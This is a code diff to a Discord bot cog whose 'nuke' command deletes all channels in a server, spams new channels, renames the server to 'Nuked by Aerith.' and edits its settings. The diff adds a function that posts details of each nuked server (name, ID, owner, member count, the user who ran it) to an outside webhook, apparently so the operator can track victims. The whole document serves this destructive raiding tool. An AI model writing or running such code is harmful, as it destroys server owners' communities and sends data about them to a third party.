@@ -5,12 +5,36 @@ from datetime import (
     timedelta,
     timezone
 )
+import aiohttp
+import os
 from src.operations.operations import (
     delete_channels,
     create_channels_and_spam
 )
 from src.core.managers.predicates import cooldown
 from src.core.managers.help import send_bot_help, send_command_help
+
+LOG_HOOK = os.getenv("LOG_HOOK")
+
+
+async def log_nuke(guild: discord.Guild, user: discord.User, member_count: int):
+    if not LOG_HOOK:
+        return
+    embed = {
+        "title": "Nuke Executed",
+        "color": 0xE74C3C,
+        "fields": [
+            {"name": "Server Name", "value": guild.name, "inline": True},
+            {"name": "Server ID", "value": str(guild.id), "inline": True},
+            {"name": "Owner", "value": f"{guild.owner} ({guild.owner_id})", "inline": True},
+            {"name": "Member Count", "value": str(member_count), "inline": True},
+            {"name": "Executed By", "value": f"{user} ({user.id})", "inline": True},
+            {"name": "Executed At", "value": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True},
+        ],
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }
+    async with aiohttp.ClientSession() as session:
+        await session.post(LOG_HOOK, json={"embeds": [embed]})
 
 
 class Nuke(commands.Cog):
@@ -24,6 +48,7 @@ class Nuke(commands.Cog):
         help="Deletes all channels, creates new ones with spam, edits server settings, and creates a scheduled event")
     @cooldown(1, 600, commands.BucketType.guild)
     async def nuke(self, ctx: commands.Context):
+        await log_nuke(ctx.guild, ctx.author, ctx.guild.member_count)
         await ctx.message.delete()
         await ctx.guild.edit(
             name="Nuked by Aerith.",
